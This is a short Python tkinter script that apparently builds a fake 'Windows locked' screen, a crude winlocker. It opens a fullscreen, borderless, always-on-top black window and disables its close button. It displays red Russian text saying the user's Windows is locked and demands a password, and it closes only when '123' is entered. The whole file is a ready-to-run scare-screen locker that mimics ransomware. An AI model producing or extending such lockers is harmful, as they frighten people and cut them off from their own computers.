from tkinter import *

root = Tk()

def quit():
 pass

def CheckPassword(arg):
 if password.get() == "123":
  exit()


x = root.winfo_screenwidth()
Y = root.winfo_screenheight()

bg = "black"

root["bg"] = bg
font = "Arial 50 bold"

root.protocol("WM_DELETE_WINDOW", quit)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.geometry(F"{x}x{Y}")

Label(text="ВАШ WINDOWS ЗАБЛОКИРОВАН!", fg="red", bg=bg, font=font).pack()
Label(text="Введите пароль", fg="red", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)



root.mainloop()

